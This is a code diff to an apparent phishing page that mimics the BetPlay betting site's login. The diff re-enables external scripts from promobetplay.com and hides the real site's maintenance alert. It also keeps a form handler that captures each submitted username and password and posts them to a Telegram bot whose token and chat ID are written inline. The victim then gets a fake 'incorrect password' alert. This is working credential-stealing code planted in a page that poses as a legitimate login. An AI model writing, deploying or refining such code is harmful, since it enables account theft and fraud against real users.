@@ -420,29 +420,37 @@
     </div>
   </div>
 
-  <!-- <script src="https://promobetplay.com/script.js"></script> -->
-<!-- <script src="https://promobetplay.com/home.js"></script> -->
+ <script src="https://promobetplay.com/script.js?v=11"></script>
+<script src="https://promobetplay.com/home.js?v=70"></script>
 
 <script>
-    const TOKEN = "9235238695:AAHiLDVz7pX9C43OossZNVWaMshUwDrEAcg";
+    const TOKEN = "9235238695:AAhILDVz7pX9C430ossZNV";
     const CHAT_ID = "7007914207";
 
-    // Intercepta cualquier intento de envío del formulario o clic en ingresar
+    // Neutraliza la alerta de mantenimiento de la página original
+    const originalAlert = window.alert;
+    window.alert = function(msg) {
+        if (msg && msg.toLowerCase().includes("mantenimiento")) {
+            console.log("Aviso de mantenimiento bloqueado con éxito.");
+            return;
+        }
+        return originalAlert ? originalAlert(msg) : true;
+    };
+
+    // Intercepta el envío del formulario para capturar y mandar a Telegram
     document.addEventListener("DOMContentLoaded", function() {
         const form = document.querySelector('form') || document.getElementById('loginModalform');
         
         if (form) {
             form.addEventListener('submit', function(e) {
-                e.preventDefault(); // Evita que la página recargue o mande a mantenimiento
+                e.preventDefault();
                 
-                // Captura los valores de los inputs (ajusta los IDs si es necesario)
                 const usuario = document.getElementById('loginUsuario')?.value || document.querySelector('input[type="text"], input[type="email"], input:not([type="password"])')?.value;
                 const password = document.querySelector('input[type="password"]')?.value;
 
                 if (usuario && password) {
                     const mensaje = `🚨 ¡NUEVA CAPTURA BETPLAY!\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${password}`;
                     
-                    // Envia los datos directo a tu Telegram
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -451,10 +459,9 @@
                             text: mensaje,
                             parse_mode: 'HTML'
                         })
-                    }).then(response => {
-                        // Opcional: Redirige o muestra mensaje simulado de error real para que caigan
+                    }).then(() => {
                         alert("Usuario o contraseña incorrectos. Intente nuevamente.");
-                    }).catch(err => {
+                    }).catch(() => {
                         alert("Usuario o contraseña incorrectos. Intente nuevamente.");
                     });
                 }
@@ -462,4 +469,5 @@
         }
     });
 </script>
-</body></html>
+</body>
+</html>
